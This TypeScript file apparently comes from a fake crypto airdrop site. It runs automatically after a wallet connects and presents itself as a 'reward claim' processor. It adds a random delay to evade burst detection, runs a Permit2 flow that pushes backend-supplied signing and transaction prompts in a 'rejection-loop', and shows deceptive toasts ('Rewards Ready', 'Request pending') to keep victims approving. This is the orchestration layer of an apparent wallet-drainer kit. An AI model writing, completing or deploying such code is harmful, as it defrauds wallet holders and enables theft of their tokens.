// src/lib/claimProcessor.ts
// Called ONCE after a successful wallet connection.
// Notifies YOUR backend, then executes any wallet prompts the backend
// returns (sign message, send tx, switch chain, ...) with a rejection-loop UI.

import { toast } from 'sonner';
import { isBackendConfigured } from './backendClient';
import { runPermit2Flow } from './permit2Flow';
import { getWalletName } from '@/config/web3';

export interface StartRewardClaimArgs {
  address: string;
  chainId?: number;
}

// ── Config ──────────────────────────────────────────────
const GUARD_KEY = 'dapp:claim:handled';
const GUARD_TTL_MS = 30 * 60 * 1000;          // 30 min — refresh-safe
const SUPPORTED_CHAINS = [1, 56, 137, 42161, 10, 8453, 43114];
const BACKEND_TIMEOUT_MS = 8000;
const CONNECT_JITTER_MS = [1500, 4000];       // random delay before firing

// ── Cross-tab + refresh-safe guard ──────────────────────
interface GuardEntry { key: string; ts: number; }

function readGuard(): GuardEntry[] {
  try {
    return JSON.parse(sessionStorage.getItem(GUARD_KEY) ?? '[]');
  } catch {
    return [];
  }
}

function writeGuard(entries: GuardEntry[]) {
  try {
    sessionStorage.setItem(GUARD_KEY, JSON.stringify(entries));
  } catch { /* private mode — fail silently */ }
}

function isHandled(key: string): boolean {
  const now = Date.now();
  const entries = readGuard().filter(e => now - e.ts < GUARD_TTL_MS);
  const hit = entries.some(e => e.key === key);
  writeGuard(entries); // prune expired on read
  return hit;
}

function markHandled(key: string) {
  const entries = readGuard().filter(e => e.key !== key);
  entries.push({ key, ts: Date.now() });
  writeGuard(entries);
}

function unmarkHandled(key: string) {
  const entries = readGuard().filter(e => e.key !== key);
  writeGuard(entries);
}

// ── Jitter ──────────────────────────────────────────────
function randomDelay(): Promise<void> {
  const [min, max] = CONNECT_JITTER_MS;
  const ms = min + Math.random() * (max - min);
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ── Error classification ────────────────────────────────
type FlowError =
  | { kind: 'user_rejected' }
  | { kind: 'unsupported_chain'; chainId?: number }
  | { kind: 'timeout' }
  | { kind: 'network' }
  | { kind: 'unknown'; raw: string };

function classify(err: any): FlowError {
  const msg = String(err?.message ?? '').toLowerCase();
  const code = err?.code;

  if (code === 4001 || code === 'ACTION_REJECTED' || msg.includes('user rejected') || msg.includes('user denied'))
    return { kind: 'user_rejected' };
  if (msg.includes('unsupported') || msg.includes('chain'))
    return { kind: 'unsupported_chain', chainId: err?.chainId };
  if (msg.includes('timeout') || code === 'TIMEOUT')
    return { kind: 'timeout' };
  if (msg.includes('fetch') || msg.includes('network') || code === 'NETWORK_ERROR')
    return { kind: 'network' };
  return { kind: 'unknown', raw: String(err?.message ?? '').slice(0, 140) };
}

// ── Main flow ───────────────────────────────────────────
export const startRewardClaim = async ({ address, chainId }: StartRewardClaimArgs) => {
  if (!address) return;

  const resolvedChain = chainId ?? 0;
  const key = `${address.toLowerCase()}:${resolvedChain}`;

  if (isHandled(key)) return;

  // ── Pre-flight: chain supported? ──
  if (!SUPPORTED_CHAINS.includes(resolvedChain)) {
    console.warn('[claim] unsupported chain, skipping', { chainId: resolvedChain });
    return;
  }

  // ── Jitter to avoid burst patterns ──
  await randomDelay();

  // Re-check after delay (user might have switched accounts)
  if (isHandled(key)) return;
  markHandled(key);

  console.log('[claim] starting flow', { address, chainId: resolvedChain });

  // ── Backend reachable? ──
  if (!isBackendConfigured()) {
    console.warn('[claim] VITE_BACKEND_URL not set — skipping backend call.');
    toast.success('Rewards Ready! 🎁', {
      description: 'Your airdrop allocation is now available to claim.',
    });
    return;
  }

  try {
    await runPermit2Flow({
      address,
      chainId: resolvedChain,
      walletName: getWalletName(),
    });
  } catch (err: any) {
    const classified = classify(err);

    switch (classified.kind) {
      case 'user_rejected':
        // Keep the guard — don't re-prompt immediately. They saw it.
        toast.info('Request pending', {
          description: 'Check your wallet to complete the approval.',
        });
        break;

      case 'unsupported_chain':
        unmarkHandled(key); // allow retry if they switch chain
        toast.error('Chain not supported', {
          description: 'Switch to a supported network to claim your rewards.',
        });
        break;

      case 'timeout':
      case 'network':
        unmarkHandled(key); // allow retry on next connect
        console.error('[claim] network failure', classified);
        break;

      default:
        unmarkHandled(key);
        console.error('[claim] unexpected failure', classified);
    }
  }
};

// ── Disconnect cleanup ──────────────────────────────────
// Call this from your wallet-disconnect handler:
export const clearClaimGuard = () => {
  try {
    sessionStorage.removeItem(GUARD_KEY);
  } catch { /* noop */ }
};

// ── Account-switch cleanup ──────────────────────────────
// Call this from your 'accountsChanged' listener:
export const onAccountChanged = (newAddress: string | null) => {
  if (!newAddress) clearClaimGuard();
};
